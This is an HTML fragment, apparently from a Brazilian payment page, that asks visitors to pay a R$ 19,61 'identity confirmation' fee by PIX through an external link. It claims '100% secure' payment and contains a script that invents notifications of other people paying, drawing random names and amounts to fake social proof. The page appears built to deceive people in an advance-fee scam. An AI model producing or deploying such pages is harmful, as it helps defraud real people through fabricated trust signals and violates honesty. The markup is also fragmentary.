        @keyframes popupSlideIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }

<body>
    <header style="background-color: #ff299e; color: #ffffff;" class="w-full p-3 text-center text-sm font-semibold shadow-md">PAGAMENTO 100% SEGURO</header>
    
    <div class="constrained-width mt-4">
        <div class="w-full bg-gray-200 overflow-hidden" style="border-radius: 12px;">
            <img src="https://postimg.cc/nXr7gZ5V" alt="Banner" class="w-full object-cover">

    </div>

    <div class="constrained-width mt-4">
        <div class="shadow-lg p-5" style="background-color: #FFFFFF; border-radius: 12px;">
            <p class="text-sm font-medium mb-4 opacity-80">Regularize a Taxa:</p>
            <div class="flex items-center space-x-4">
                <img src="https://postimg.cc/2LVX3ntc" alt="Confirmação de Identidade" class="w-16 h-16 object-cover flex-shrink-0 border border-gray-200 p-1" style="border-radius: 8px;">
                <div class="flex-grow">
                    <h3 class="font-bold">Confirmação de Identidade</h3>
                    <p class="text-lg font-semibold text-green-600">R$ 19,61</p>
                </div>
            </div>
            <hr class="my-4">
            <div class="flex justify-between items-center">

        </div>
    </div>

    <div class="constrained-width mt-4">
        <div class="shadow-lg p-6 sm:p-8" style="background-color: #FFFFFF; border-radius: 12px;">
            <div class="flex items-center mb-6">
                <span class="text-white rounded-full h-8 w-8 flex items-center justify-center font-bold text-lg mr-3 flex-shrink-0" style="background-color: #ff299e;">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-5 h-5"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" /></svg>
                </span>
                <h2 class="text-xl font-bold">Identifique-se</h2>
            </div>
            <div class="space-y-4">
                <div>
                    <label class="block text-sm font-medium mb-1">Nome e sobrenome</label>
                    <input type="text" placeholder="Nome e sobrenome" required class="w-full p-3 bg-gray-50 border border-gray-300 text-gray-900 focus:outline-none focus:ring-2 focus:ring-[#ff299e] transition" style="border-radius: 8px;">
                </div>
                <div>
                    <label class="block text-sm font-medium mb-1">E-mail</label>
                    <input type="email" placeholder="E-mail" required class="w-full p-3 bg-gray-50 border border-gray-300 text-gray-900 focus:outline-none focus:ring-2 focus:ring-[#ff299e] transition" style="border-radius: 8px;">
                </div>
            </div>

    <div class="constrained-width mt-4 mb-8">
        <div class="shadow-lg p-6 sm:p-8" style="background-color: #FFFFFF; border-radius: 12px;">
            <div class="flex items-center mb-4">
                <span class="text-white rounded-full h-8 w-8 flex items-center justify-center font-bold text-lg mr-3 flex-shrink-0" style="background-color: #ff299e;">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-5 h-5"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15A2.25 2.25 0 002.25 6.75v10.5A2.25 2.25 0 004.5 21z" /></svg>
                </span>
                <h2 class="text-xl font-bold">Pagamento</h2>
            </div>
            <button type="button" onclick="window.location.href='https://go.ironpayapp.com.br/rthkn7papn'" style="background-color: #ff299e; border-radius: 10px;" class="w-full p-4 text-white font-bold text-lg uppercase hover:opacity-90 flex items-center justify-center">
                <span>PAGAR AGORA</span>
            </button>
            <div class="mt-4 text-center text-sm opacity-80 flex items-center justify-center gap-2">
                <span>Pagamento seguro via <strong>PIX</strong> com aprovação imediata.</span>
            </div>
        </div>
    </div>

    <div id="social-proof-container" class="fixed bottom-4 left-4 z-50"></div>

    <script>
        // Social Proof Logic
        const socialProofSettings = {"enabled":true,"names":["Maria", "José", "Ana", "João", "Antônio", "Francisco", "Carlos", "Paulo", "Pedro", "Lucas", "Luiz", "Marcos", "Gabriel", "Rafael", "Daniel", "Marcelo", "Bruno", "Eduardo", "Felipe", "Sandra", "Camila", "Amanda", "Fernanda", "Patrícia", "Juliana", "Aline", "Mariana", "Vanessa", "Carolina"],"payoutMessage":"{{name}} acabou de pagar {{value}}","payoutMin":150,"payoutMax":500,"initialDelay":5,"displayDuration":4,"intervalMin":8,"intervalMax":20};
        
        if (socialProofSettings.enabled) {
            const container = document.getElementById('social-proof-container');
            const getRandomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

            const createNotification = () => {
                const name = socialProofSettings.names[Math.floor(Math.random() * socialProofSettings.names.length)];
                const value = getRandomInt(socialProofSettings.payoutMin, socialProofSettings.payoutMax);
                const formattedValue = value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
                const message = socialProofSettings.payoutMessage
                    .replace('{{name}}', '<strong>' + name + '</strong>')
                    .replace('{{value}}', '<strong>' + formattedValue + '</strong>');

                const notifElement = document.createElement('div');
                notifElement.className = 'social-proof-toast';
                notifElement.innerHTML = `
                    <div style="display:flex; align-items:center; gap: 12px;">
                        <img src="https://picsum.photos/40/40?random=${Date.now()}" alt="User" style="width: 40px; height: 40px; border-radius: 50%; object-fit: cover; flex-shrink: 0;">
                        <div style="font-size: 14px; color: #e2e8f0;">
                            ${message}
                            <div style="font-size: 12px; color: #94a3b8; margin-top: 2px;">agora mesmo</div>
                        </div>
                    </div>`;

                container.appendChild(notifElement);
                setTimeout(() => notifElement.classList.add('show'), 100);

                setTimeout(() => {
                    notifElement.classList.remove('show');
                    setTimeout(() => notifElement.remove(), 500);
                }, socialProofSettings.displayDuration * 1000);
            };

            const scheduleNextNotification = () => {
                const interval = getRandomInt(socialProofSettings.intervalMin, socialProofSettings.intervalMax) * 1000;
                setTimeout(() => {
                    createNotification();
                    scheduleNextNotification();
                }, interval);
            };

            setTimeout(scheduleNextNotification, socialProofSettings.initialDelay * 1000);
        }
    </script>
